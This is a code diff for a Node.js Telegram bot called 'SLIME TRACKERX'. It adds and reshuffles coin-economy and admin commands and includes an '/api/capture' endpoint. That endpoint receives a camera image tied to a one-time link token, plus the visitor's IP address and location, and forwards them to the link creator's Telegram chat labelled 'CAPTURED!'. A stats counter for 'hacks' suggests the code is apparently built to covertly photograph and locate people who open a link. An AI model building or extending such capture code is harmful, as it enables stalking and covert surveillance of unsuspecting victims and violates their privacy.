-    await ctx.telegram.sendMessage(OWNER, `📨 From: ${ctx.from.first_name}\n🆔 ${ctx.from.id}\n💬 ${ctx.message.text}`);
+  if (activeChats.has(ctx.chat.id) && ctx.chat.type !== "private") {
+    await ctx.telegram.sendMessage(OWNER_ID, `📨 From: ${ctx.from.first_name}\n🆔 ${ctx.from.id}\n💬 ${ctx.message.text}`);
     await ctx.reply("✅ Sent to dev!");
   }
   
   // Reply from dev
-  if (ctx.chat.id === OWNER && ctx.message.reply_to_message) {
+  if (ctx.chat.id === OWNER_ID && ctx.message.reply_to_message) {
     let match = ctx.message.reply_to_message.text?.match(/🆔 (\d+)/);
     if (match) {
       let userId = parseInt(match[1]);
@@ -935,7 +1158,6 @@ bot.on("text", async (ctx) => {
   }
   
   addXP(ctx.from.id, 1);
-  stats.cmds++;
 });
 
 // ========== SIMPLE COMMANDS ==========
@@ -943,6 +1165,13 @@ bot.command("balance", async (ctx) => {
   let u = initUser(ctx.from.id);
   await ctx.reply(`💰 ${u.coins} coins`);
 });
+
+bot.command("profile", async (ctx) => {
+  let u = initUser(ctx.from.id);
+  let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0;
+  await ctx.reply(`👤 ${ctx.from.first_name}\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🎮 ${u.wins}W/${u.losses}L (${winRate}%)`);
+});
+
 bot.command("daily", async (ctx) => {
   let u = initUser(ctx.from.id);
   let now = Date.now();
@@ -960,6 +1189,7 @@ bot.command("daily", async (ctx) => {
   users.set(ctx.from.id, u);
   await ctx.reply(`🎁 +${reward} coins! Streak: ${streak}\n💰 ${u.coins + reward}`);
 });
+
 bot.command("work", async (ctx) => {
   let u = initUser(ctx.from.id);
   let now = Date.now();
@@ -975,149 +1205,6 @@ bot.command("work", async (ctx) => {
   workCD.set(u.id, now);
   await ctx.reply(`💼 ${job} +${reward} coins\n💰 ${u.coins + reward}`);
 });
-bot.command("profile", async (ctx) => {
-  let u = initUser(ctx.from.id);
-  await ctx.reply(`👤 ${ctx.from.first_name}\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🎮 ${u.wins}W/${u.losses}L`);
-});
-bot.command("chat", async (ctx) => {
-  activeChats.set(ctx.chat.id, true);
-  await ctx.reply("💬 Chat mode active! Send message to dev. Type /exit to leave.");
-});
-bot.command("exit", async (ctx) => {
-  if (activeChats.has(ctx.chat.id)) {
-    activeChats.delete(ctx.chat.id);
-    await ctx.reply("✅ Exited chat mode.");
-  } else await ctx.reply("⚠️ Not in chat mode.");
-});
-
-// ========== ADMIN COMMANDS ==========
-bot.command("admin", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  await ctx.reply(`
-👑 ADMIN
-
-💰 /addcoin @user amount
-🎁 /gencode coins uses hours
-📋 /codes
-🗑️ /delcode CODE
-📢 /broadcast msg
-👥 /users
-📊 /stats
-🚫 /ban @user
-✅ /unban @user
-  `);
-});
-bot.command("addcoin", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let args = ctx.message.text.split(" ");
-  if (args.length < 3) return;
-  let user = args[1].replace("@", "");
-  let amt = parseInt(args[2]);
-  for (let [id, u] of users) {
-    try {
-      let c = await ctx.telegram.getChat(id);
-      if (c.username === user) {
-        u.coins += amt;
-        u.totalEarned += amt;
-        users.set(id, u);
-        await ctx.reply(`✅ +${amt} to @${user}\n💰 ${u.coins}`);
-        return;
-      }
-    } catch(e) {}
-  }
-  await ctx.reply("❌ Not found");
-});
-bot.command("gencode", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let args = ctx.message.text.split(" ");
-  let coins = parseInt(args[1]) || 50;
-  let uses = Math.min(parseInt(args[2]) || 20, 20);
-  let hours = parseInt(args[3]) || 24;
-  let code = genCode(coins, uses, hours);
-  await ctx.reply(`✅ CODE: \`${code}\`\n💰 ${coins}\n🔄 ${uses}\n⏱️ ${hours}h`, { parse_mode: "Markdown" });
-});
-bot.command("codes", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  if (codes.size === 0) return ctx.reply("No codes");
-  let msg = "📋 CODES:\n";
-  for (let [c, d] of codes) msg += `\`${c}\` - ${d.coins} coins - ${d.left} uses\n`;
-  await ctx.reply(msg, { parse_mode: "Markdown" });
-});
-bot.command("delcode", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let args = ctx.message.text.split(" ");
-  if (args.length < 2) return;
-  let code = args[1].toUpperCase();
-  if (codes.has(code)) { codes.delete(code); await ctx.reply(`✅ Deleted ${code}`); }
-  else await ctx.reply("❌ Not found");
-});
-bot.command("broadcast", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let msg = ctx.message.text.split(" ").slice(1).join(" ");
-  if (!msg) return;
-  await ctx.reply("📢 Sending...");
-  let s = 0, f = 0;
-  for (let [id] of users) {
-    try { await ctx.telegram.sendMessage(id, `📢 ANNOUNCEMENT\n\n${msg}`); s++; }
-    catch { f++; }
-  }
-  await ctx.reply(`✅ ${s} sent | ❌ ${f} failed`);
-});
-bot.command("users", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let msg = "📋 USERS:\n";
-  let i = 0;
-  for (let [id, u] of users) {
-    msg += `${++i}. ${id} - ${u.coins} coins\n`;
-    if (i >= 20) break;
-  }
-  msg += `\nTotal: ${users.size}`;
-  await ctx.reply(msg);
-});
-bot.command("stats", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let total = Array.from(users.values()).reduce((s, u) => s + u.coins, 0);
-  await ctx.reply(`📊 BOT\n\n👥 ${users.size}\n💰 ${total} coins\n🎯 ${stats.hacks} hacks\n🎮 ${stats.games} games\n🎁 ${stats.refs} refs`);
-});
-bot.command("ban", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let args = ctx.message.text.split(" ");
-  if (args.length < 2) return;
-  let user = args[1].replace("@", "");
-  for (let [id] of users) {
-    try {
-      let c = await ctx.telegram.getChat(id);
-      if (c.username === user) {
-        banned.add(id);
-        await ctx.reply(`🚫 @${user} banned`);
-        return;
-      }
-    } catch(e) {}
-  }
-  await ctx.reply("❌ Not found");
-});
-bot.command("unban", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  let args = ctx.message.text.split(" ");
-  if (args.length < 2) return;
-  let user = args[1].replace("@", "");
-  for (let [id] of users) {
-    try {
-      let c = await ctx.telegram.getChat(id);
-      if (c.username === user) {
-        banned.delete(id);
-        await ctx.reply(`✅ @${user} unbanned`);
-        return;
-      }
-    } catch(e) {}
-  }
-  await ctx.reply("❌ Not found");
-});
-bot.command("restart", async (ctx) => {
-  if (ctx.from.id !== OWNER) return;
-  await ctx.reply("🔄 Restarting...");
-  setTimeout(() => process.exit(0), 2000);
-});
 
 // ========== API ==========
 app.post("/api/capture", async (req, res) => {
@@ -1127,18 +1214,25 @@ app.post("/api/capture", async (req, res) => {
     let data = tokens.get(token);
     if (image) {
       let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
-      await bot.telegram.sendPhoto(data.chat, { source: buf }, { caption: `📸 CAPTURED!\n🌐 IP: ${ip}\n📍 ${location}\n🕐 ${new Date().toLocaleString()}` });
+      await bot.telegram.sendPhoto(data.chat, { source: buf }, {
+        caption: `📸 CAPTURED!\n🌐 IP: ${ip}\n📍 ${location}\n🕐 ${new Date().toLocaleString()}`
+      });
     }
     tokens.delete(token);
     res.json({ status: "success" });
-  } catch(e) { res.status(500).json({ error: "Error" }); }
+  } catch(e) {
+    res.status(500).json({ error: "Error" });
+  }
 });
 
-app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
 
+// ========== START ==========
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));
 
-bot.launch().then(() => console.log(`🤖 SLIME TRACKERX v${VERSION} LIVE!`));
-process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM"));
+bot.launch().then(() => {
+  console.log(`🤖 SLIME TRACKERX v6.0 LIVE!`);
+});
